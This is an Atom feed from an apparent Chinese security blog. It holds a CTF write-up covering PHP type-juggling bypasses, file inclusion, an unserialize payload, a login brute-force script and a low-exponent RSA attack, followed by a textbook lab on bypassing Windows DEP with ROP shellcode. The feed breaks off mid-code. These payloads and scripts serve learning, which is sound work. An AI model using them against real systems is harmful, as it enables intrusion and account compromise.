<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ct10n&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-10-17T09:14:27.971Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>4ct10n</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>世安杯WP</title>
    <link href="http://yoursite.com/2017/10/17/%E4%B8%96%E5%AE%89%E6%9D%AFWP/"/>
    <id>http://yoursite.com/2017/10/17/世安杯WP/</id>
    <published>2017-10-17T09:14:27.971Z</published>
    <updated>2017-10-17T09:14:27.971Z</updated>
    
    <content type="html"><![CDATA[<p>asdads<br><a id="more"></a></p><h2 id="ctf入门及题目"><a href="#ctf入门及题目" class="headerlink" title="ctf入门及题目"></a>ctf入门及题目</h2><p>有源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$flag = &apos;*********&apos;;</div><div class="line"></div><div class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</div><div class="line">    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</div><div class="line">        echo &apos;&lt;p class=&quot;alert&quot;&gt;You password must be alphanumeric&lt;/p&gt;&apos;;</div><div class="line">    else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE)</div><div class="line">        die($flag);</div><div class="line">    else</div><div class="line">        echo &apos;&lt;p class=&quot;alert&quot;&gt;Invalid password&lt;/p&gt;&apos;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>直接ereg 判断必须为 alphanumeric 而strpos要求带–，想到利用阶段<br>password=123%00–</p><h2 id="曲奇饼"><a href="#曲奇饼" class="headerlink" title="曲奇饼"></a>曲奇饼</h2><p>发现有文件包含<br><code>?line=&amp;file=a2V5LnR4dA==</code><br>可以读到index.php源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0); </div><div class="line">$file=base64_decode(isset($_GET[&apos;file&apos;])?$_GET[&apos;file&apos;]:&quot;&quot;); </div><div class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; </div><div class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;file=a2V5LnR4dA==&quot;); </div><div class="line">$file_list = array( </div><div class="line">&apos;0&apos; =&gt;&apos;key.txt&apos;, </div><div class="line">&apos;1&apos; =&gt;&apos;index.php&apos;, </div><div class="line">); </div><div class="line">if(isset($_COOKIE[&apos;key&apos;]) &amp;&amp; $_COOKIE[&apos;key&apos;]==&apos;an_yun_tec&apos;)&#123;  </div><div class="line">$file_list[2]=&apos;thisis_key.php&apos;; </div><div class="line">&#125; </div><div class="line">if(in_array($file, $file_list))&#123; </div><div class="line">$fa = file($file); </div><div class="line">echo $fa[$line]; </div><div class="line">&#125; </div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>然后审计下构造如下请求： </p><p>$_COOKIE[‘key’]==’an_yun_tec’</p><p>?file=thisis_key.php</p><p>拿到flag</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>有源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"> &lt;?php</div><div class="line">show_source(__FILE__);</div><div class="line">$a=0;</div><div class="line">$b=0;</div><div class="line">$c=0;</div><div class="line">$d=0;</div><div class="line">if (isset($_GET[&apos;x1&apos;]))</div><div class="line">&#123;</div><div class="line">        $x1 = $_GET[&apos;x1&apos;];</div><div class="line">        $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;</div><div class="line">        switch ($x1)</div><div class="line">        &#123;</div><div class="line">        case 0:</div><div class="line">        case 1:</div><div class="line">                $a=1;</div><div class="line">                break;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$x2=(array)json_decode(@$_GET[&apos;x2&apos;]);</div><div class="line">if(is_array($x2))&#123;</div><div class="line">    is_numeric(@$x2[&quot;x21&quot;])?die(&quot;ha?&quot;):NULL;</div><div class="line">    if(@$x2[&quot;x21&quot;])&#123;</div><div class="line">        ($x2[&quot;x21&quot;]&gt;2017)?$b=1:NULL;</div><div class="line">    &#125;</div><div class="line">    if(is_array(@$x2[&quot;x22&quot;]))&#123;</div><div class="line">        if(count($x2[&quot;x22&quot;])!==2 OR !is_array($x2[&quot;x22&quot;][0])) die(&quot;ha?&quot;);</div><div class="line">        $p = array_search(&quot;XIPU&quot;, $x2[&quot;x22&quot;]);</div><div class="line">        $p===false?die(&quot;ha?&quot;):NULL;</div><div class="line">        foreach($x2[&quot;x22&quot;] as $key=&gt;$val)&#123;</div><div class="line">            $val===&quot;XIPU&quot;?die(&quot;ha?&quot;):NULL;</div><div class="line">        &#125;</div><div class="line">        $c=1;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$x3 = $_GET[&apos;x3&apos;];</div><div class="line">if ($x3 != &apos;15562&apos;) &#123;</div><div class="line">    if (strstr($x3, &apos;XIPU&apos;)) &#123;</div><div class="line">        if (substr(md5($x3),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123;</div><div class="line">            $d=1;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">if($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123;</div><div class="line">    include &quot;flag.php&quot;;</div><div class="line">    echo $flag;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>第一个是switch没有加break，所以用0绕过<br>第二个php 当字符串与数字比较时现将字符串转化为数字2018a绕过<br>第三个同第二个绕过 0 ==‘XIPU’<br>第四个 php 0e弱类型<br>脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">import random</div><div class="line">import string</div><div class="line">import re</div><div class="line">def md5(str):</div><div class="line">    import hashlib</div><div class="line">    m = hashlib.md5()</div><div class="line">    m.update(str)</div><div class="line">    return m.hexdigest()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">while 1:</div><div class="line">    string = &apos;&apos;</div><div class="line">    s = string.join(random.sample(&apos;qwertyuiopasdfghjklzxcvbnm1234567890&apos;,4))</div><div class="line">    if (re.findall(&apos;^0e[0-9]&#123;14,14&#125;$&apos;,md5(&apos;XIPU&apos;+s)[8:24])):</div><div class="line">        print &apos;XIPU&apos;+s,md5(&apos;XIPU&apos;+s)[8:24]</div></pre></td></tr></table></figure><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>发现源码有提示 五位数字的密码</p><p>写脚本跑吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"># coding:utf-8</div><div class="line">import requests</div><div class="line">import re</div><div class="line">import threading</div><div class="line"></div><div class="line">r = requests.session()</div><div class="line">url = &apos;http://ctf1.shiyanbar.com/shian-s/index.php&apos;</div><div class="line"></div><div class="line">def get_rand():</div><div class="line">s = r.get(url=url)</div><div class="line">return re.findall(&quot;[0-9]&#123;3,6&#125;&quot;,s.content)[0]</div><div class="line"></div><div class="line">def test(password):</div><div class="line">data = &#123;</div><div class="line">&apos;username&apos;:&apos;admin&apos;,</div><div class="line">&apos;password&apos;:password,</div><div class="line">&apos;randcode&apos;:get_rand()</div><div class="line">&#125;</div><div class="line">s = r.get(url=url,params=data)</div><div class="line">if &quot;密码错误&quot; not in s.content:</div><div class="line">print s.content,password</div><div class="line">exit()</div><div class="line"></div><div class="line"></div><div class="line">for i in range(9999):</div><div class="line">test(&quot;0&quot;*(5-len(str(i)))+str(i))</div><div class="line"></div><div class="line">for i in range(10000,100000):</div><div class="line">test(i)</div><div class="line"># print i</div></pre></td></tr></table></figure><p><img src="/2017/10/17/世安杯WP/1.png" alt=""></p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>有源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;!--</div><div class="line">$user = $_GET[&quot;user&quot;];</div><div class="line">$file = $_GET[&quot;file&quot;];</div><div class="line">$pass = $_GET[&quot;pass&quot;];</div><div class="line"></div><div class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</div><div class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</div><div class="line">    include($file); //class.php</div><div class="line">&#125;else&#123;</div><div class="line">    echo &quot;you are not admin ! &quot;;</div><div class="line">&#125;</div><div class="line"> --&gt;</div></pre></td></tr></table></figure><p>文件包含<br>利用伪协议绕过<br>(file_get_contents($user,’r’)===”the user is admin”</p><p>php://input 即可<br>然后利用php://fiter/convert.base64-encode/resource=index.php<br>读取源码<br>发现是个反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$user = $_GET[&quot;user&quot;];</div><div class="line">$file = $_GET[&quot;file&quot;];</div><div class="line">$pass = $_GET[&quot;pass&quot;];</div><div class="line"></div><div class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</div><div class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</div><div class="line">    if(preg_match(&quot;/f1a9/&quot;,$file))&#123;</div><div class="line">        exit();</div><div class="line">    &#125;else&#123;</div><div class="line">        include($file); //class.php</div><div class="line">        $pass = unserialize($pass);</div><div class="line">        echo $pass;</div><div class="line">    &#125;</div><div class="line">&#125;else&#123;</div><div class="line">    echo &quot;you are not admin ! &quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;!--</div><div class="line">$user = $_GET[&quot;user&quot;];</div><div class="line">$file = $_GET[&quot;file&quot;];</div><div class="line">$pass = $_GET[&quot;pass&quot;];</div><div class="line"></div><div class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</div><div class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</div><div class="line">    include($file); //class.php</div><div class="line">&#125;else&#123;</div><div class="line">    echo &quot;you are not admin ! &quot;;</div><div class="line">&#125;</div><div class="line"> --</div></pre></td></tr></table></figure><p>坑在这里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">include($file); //class.php</div><div class="line">        $pass = unserialize($pass);</div><div class="line">        echo $pass;</div></pre></td></tr></table></figure><p>这里在提交最后的payload的时候必须include  class.php<br>因为里面有tostring方法 能echo执行</p><p>所以最后的payload为<br><code>http://localhost:8000/?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;}</code></p><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>只给了nc ，那么8成是低加密指数攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line">__author__ = &apos;4ct10n&apos;</div><div class="line">from libnum import s2n,n2s</div><div class="line">from gmpy import root</div><div class="line">n = 92164540447138944597127069158431585971338721360079328713704210939368383094265948407248342716209676429509660101179587761913570951794712775006017595393099131542462929920832865544705879355440749903797967940767833598657143883346150948256232023103001435628434505839331854097791025034667912357133996133877280328143</div><div class="line">e = 3</div><div class="line">c = 2044619806634581710230401748541393297937319</div><div class="line"></div><div class="line">i = 0</div><div class="line">while 1:</div><div class="line">    res = root(c+i*n,3)</div><div class="line">    if(res[1] == True):</div><div class="line">        print n2s(res[0])</div><div class="line">        break</div><div class="line">    print &quot;i=&quot;+str(i)</div><div class="line">    i = i+1</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;asdads&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="新建,模板,小书匠" scheme="http://yoursite.com/tags/%E6%96%B0%E5%BB%BA-%E6%A8%A1%E6%9D%BF-%E5%B0%8F%E4%B9%A6%E5%8C%A0/"/>
    
  </entry>
  
  <entry>
    <title>安全机制 DEP 绕过</title>
    <link href="http://yoursite.com/2017/10/17/%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6DEP%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2017/10/17/安全机制DEP绕过/</id>
    <published>2017-10-17T09:12:52.909Z</published>
    <updated>2017-10-17T09:12:52.909Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>DEP （Data Execution Prevention）数据保护机制，在XP SP3被引入，将地址改为不可执行，使得shellcode无法在指定位置执行。</p><h1 id="0x02-绕过方法"><a href="#0x02-绕过方法" class="headerlink" title="0x02 绕过方法"></a>0x02 绕过方法</h1><p>主要还是了解现有的一些绕过方法，0day漏洞上介绍了几种方法</p><ol><li>Ret2libc ZwSetInformationProcess</li><li>Ret2libc VirtualProtect</li><li>Ret2libc VirtualAlloc</li><li>利用可执行内存</li><li>利用.NET</li><li>利用Java applet </li></ol><p>大体上分为两种</p><ol><li>利用可执行内存</li><li>直接关闭DEP</li></ol><p><img src="/2017/10/17/安全机制DEP绕过/1.png" alt=""></p><h1 id="0x03-实验"><a href="#0x03-实验" class="headerlink" title="0x03 实验"></a>0x03 实验</h1><p>跟着书上的实验一步一步调吧，主要还是思想，学会思考的过程并不是为了最后的弹框，shellcode直接使用书上提供的健壮的代码</p><h2 id="0x1-Ret2libc-ZwSetInformationProcess"><a href="#0x1-Ret2libc-ZwSetInformationProcess" class="headerlink" title="0x1 Ret2libc ZwSetInformationProcess"></a>0x1 Ret2libc ZwSetInformationProcess</h2><p>进程的 DEP 设置标识保存在 KPROCESS 结构中的 _KEXECUTE_OPTIONS 上，而这个标识可以通过 API函数 ZwQueryInformationProcess 和 Zw SetInformationProcess 进行查询和修改，所以可以直接将进程的 DEP 保护关闭。</p><p>_KEXECUTE_OPTIONS 的结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">typedef struct _KEXECUTE_OPTIONS</div><div class="line">&#123;</div><div class="line">UCHAR Value; </div><div class="line">/*</div><div class="line">Pos0ExecuteDisable :1bit</div><div class="line">Pos1ExecuteEnable :1bit</div><div class="line">Pos2DisableThunkEmulation :1bit</div><div class="line">Pos3Permanent :1bit</div><div class="line">Pos4ExecuteDispatchEnable :1bit</div><div class="line">Pos5ImageDispatchEnable :1bit</div><div class="line">Pos6Spare :2bit</div><div class="line">*/</div><div class="line">&#125; KEXECUTE_OPTIONS;</div></pre></td></tr></table></figure></p><p>了解了_KEXECUTE_OPTIONS的结构就可以用setinformationprocess设置相应的值，只需将第二位设置位1即可，所以关闭DEP的设置为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;</div><div class="line">ZwSetInformationProcess(</div><div class="line">NtCurrentProcess(),  // (HANDLE)-1</div><div class="line">ProcessExecuteFlags, // 0x22</div><div class="line">&amp;ExecuteFlags,  // ptr to 0x2</div><div class="line">sizeof(ExecuteFlags)); // 0x4</div></pre></td></tr></table></figure><p>Q：这里有个问题为什么不直接传参调用函数执行<br>A：答案是这里用的strcpy是，如果直接传参那么参数中肯定会有零字节，所以想到了利用现有的函数调用</p><p>T：因为微软为兼容性考虑，如果一个进程的 Permanent 位没有设置，当它加载 DLL时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭</p><p>这是利用这一个trick，绕过DEP，微软设立了一个函数LdrpCheckNXCompatibility<br>满足下面三个条件之一就会触发</p><ol><li>当 DLL 受 SafeDisc 版权保护系统保护时；</li><li>当 DLL 包含有.aspcak、.pcle、.sforce 等字节时；</li><li>Windows Vista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”</li></ol><p>T：我们可以利用ollyfindaddr插件寻找关闭DEP的起始位置，同时还有一些其他的辅助地址</p><p><img src="/2017/10/17/安全机制DEP绕过/2.png" alt=""></p><p><strong>shellcode的探索过程</strong></p><p>T：retn x指令可以构造rop链，当然执行过程可以归结为下面一句话，在执行当前语句时他的下一条指令是esp的指向，下下一条指令则是esp+4+x，因此rop链的执行顺序就确定了</p><blockquote><p>为了满足第一个条件必须将al设置为1，这里利用了一个rop链，但是接着发现在执行关闭DEP代码的时候ebp地址不可写，所以要在关闭DEP之前将可赋值地址写入ebp中，接着又发现esp不够高使得shellcode的被破坏，所以要抬高esp，下面才是执行DEP，还有一个坑在DEP的最后有一个leave操作所以，最后esp=ebp+4所以在retn的时候是返回到ebp+4的位置我们还记得给ebp赋值吗，没错就是这么巧妙，esp再次回去而且是jmp esp的位置一切都是这么巧妙。看起来是偶然的东西其实都是我们一手安排的。</p></blockquote><p>贴出代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdlib.h&gt; </div><div class="line">#include&lt;string.h&gt; </div><div class="line">#include&lt;stdio.h&gt; </div><div class="line">#include&lt;windows.h&gt; </div><div class="line">char shellcode[]=  </div><div class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;  </div><div class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;  </div><div class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;  </div><div class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;  </div><div class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;  </div><div class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;  </div><div class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;  </div><div class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;  </div><div class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;  </div><div class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;  </div><div class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x52\xE2\x92\x7C&quot;//MOV EAX,1 RETN地址  </div><div class="line">&quot;\x85\x8B\x1D\x5D&quot;//修正EBP  </div><div class="line">//&quot;\x19\x4A\x97\x7C&quot;//增大ESP  </div><div class="line">&quot;\x45\x01\x88\x7c&quot;</div><div class="line">&quot;\xB4\xC1\xC5\x7D&quot;//jmp esp  </div><div class="line">&quot;\x24\xCD\x93\x7C&quot;//关闭DEP代码的起始位置  </div><div class="line">&quot;\xE9\x33\xFF\xFF&quot;//回跳指令  </div><div class="line">&quot;\xFF\x90\x90\x90&quot;  </div><div class="line">;  </div><div class="line">void test()  </div><div class="line">&#123;  </div><div class="line">      char tt[176];  </div><div class="line">      strcpy(tt,shellcode);  </div><div class="line">&#125;  </div><div class="line">int main()  </div><div class="line">&#123;  </div><div class="line">      HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;);  </div><div class="line">      char temp[200];  </div><div class="line">      test();  </div><div class="line">      return 0;  </div><div class="line">&#125;</div></pre></td></tr></table></figure><p>或者用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&quot;\x52\xE2\x92\x7C&quot;//MOV EAX,1 RETN地址 </div><div class="line">&quot;\x96\x73\x1B\x5D&quot;//修正EBP 8</div><div class="line">&quot;\x85\x8B\x1D\x5D&quot;//ebp 4</div><div class="line">&quot;\x90\x90\x90\x90&quot;</div><div class="line">&quot;\x90\x90\x90\x90&quot;</div><div class="line">//&quot;\x19\x4A\x97\x7C&quot;//增大ESP  </div><div class="line">&quot;\x45\x01\x88\x7c&quot;//esp up</div><div class="line">&quot;\xB4\xC1\xC5\x7D&quot;//jmp esp  </div><div class="line">&quot;\x24\xCD\x93\x7C&quot;//关闭DEP代码的起始位置  </div><div class="line">&quot;\xE9\x27\xFF\xFF&quot;//回跳指令  </div><div class="line">&quot;\xFF\x90\x90\x90&quot;</div></pre></td></tr></table></figure><p>都是可以的只要是明白了retn的精髓那么构造shellcode就不是问题</p><h2 id="0x2-VitualProtect"><a href="#0x2-VitualProtect" class="headerlink" title="0x2 VitualProtect"></a>0x2 VitualProtect</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">// GS_Virtual.cpp : 定义控制台应用程序的入口点。  </div><div class="line">//  </div><div class="line">  </div><div class="line">#include &lt;stdlib.h&gt;  </div><div class="line">#include &lt;string.h&gt;  </div><div class="line">#include &lt;stdio.h&gt;  </div><div class="line">#include &lt;windows.h&gt;  </div><div class="line">char shellcode[]=  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;  </div><div class="line">&quot;\x90\x90\x90\x90&quot;  </div><div class="line">  </div><div class="line">&quot;\x94\xb0\x6c\x7d&quot;   //0x7d6cb094 pop eax  ret  </div><div class="line">//&quot;\x34\x7a\xc1\x77&quot;   //POP EBX POP ESI POP EDI  RETN at 0x77c17a34     </div><div class="line">//&quot;\x26\x62\x92\x7d&quot; //POP ECX POP ECX POP ECX  RETN at 0x7d926226  </div><div class="line">&quot;\x69\x36\x5C\x7D&quot;    // pop edi,pop ebx,pop esi,retn  </div><div class="line">&quot;\xe5\xe0\x72\x7d&quot;   //0x7d72e0e5  push esp pop ebp ret 4  </div><div 